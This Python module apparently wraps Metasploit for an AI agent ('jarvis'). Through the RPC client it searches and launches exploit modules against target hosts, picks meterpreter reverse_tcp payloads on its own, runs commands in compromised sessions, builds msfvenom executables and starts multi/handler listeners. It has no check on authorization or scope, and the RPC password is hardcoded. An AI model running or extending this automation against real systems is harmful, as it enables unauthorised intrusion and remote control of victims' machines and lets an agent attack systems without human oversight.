# tools/metasploit.py
import subprocess
import json
import socket
import time

class MetasploitController:
    """
    Controls Metasploit via msfrpc (RPC daemon)
    pip install pymetasploit3
    """
    def __init__(self):
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            self.client = MsfRpcClient(
                password="msf_password",
                server="127.0.0.1",
                port=55553,
                ssl=True
            )
            print("[MSF] Connected to Metasploit RPC")
        except Exception as e:
            print(f"[MSF] Not available: {e}")
            self.client = None

    def search_exploit(self, query):
        """Search for relevant exploits"""
        if not self.client:
            return self._cli_search(query)
        modules = self.client.modules.exploits
        results = [m for m in modules if query.lower() in m.lower()]
        return results[:10]

    def _cli_search(self, query):
        """Fallback: use msfconsole CLI"""
        result = subprocess.run(
            ["msfconsole", "-q", "-x",
             f"search {query}; exit"],
            capture_output=True, text=True, timeout=30
        )
        return result.stdout

    def run_exploit(self, module, rhosts, lhost, lport=4444, payload=None):
        """Run an exploit module"""
        if not self.client:
            return "Metasploit RPC not connected"

        exploit = self.client.modules.use("exploit", module)
        exploit["RHOSTS"] = rhosts
        exploit["LHOST"]  = lhost
        exploit["LPORT"]  = lport

        if not payload:
            # auto-select best payload
            payload = self._best_payload(module)

        p = self.client.modules.use("payload", payload)
        p["LHOST"] = lhost
        p["LPORT"] = lport

        result = exploit.execute(payload=p)
        return result

    def _best_payload(self, module):
        """AI will suggest, fallback to generic"""
        if "windows" in module.lower():
            return "windows/meterpreter/reverse_tcp"
        elif "linux" in module.lower():
            return "linux/x86/meterpreter/reverse_tcp"
        return "generic/shell_reverse_tcp"

    def list_sessions(self):
        """List active meterpreter sessions"""
        if not self.client:
            return {}
        return self.client.sessions.list

    def run_meterpreter(self, session_id, command):
        """Run a command on active meterpreter session"""
        if not self.client:
            return "No RPC connection"
        session = self.client.sessions.session(str(session_id))
        session.write(command + "\n")
        time.sleep(2)
        return session.read()

    def generate_payload(self, payload_type, lhost, lport, format="exe"):
        """Generate standalone payload with msfvenom"""
        cmd = [
            "msfvenom",
            "-p", payload_type,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", format,
            "-o", f"/tmp/payload.{format}"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout + result.stderr

    def start_listener(self, lhost, lport, payload="windows/meterpreter/reverse_tcp"):
        """Start multi/handler listener"""
        rc_script = f"""
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
        with open("/tmp/jarvis_listener.rc", "w") as f:
            f.write(rc_script)

        subprocess.Popen([
            "msfconsole", "-q", "-r", "/tmp/jarvis_listener.rc"
        ])
        return f"Listener started on {lhost}:{lport}"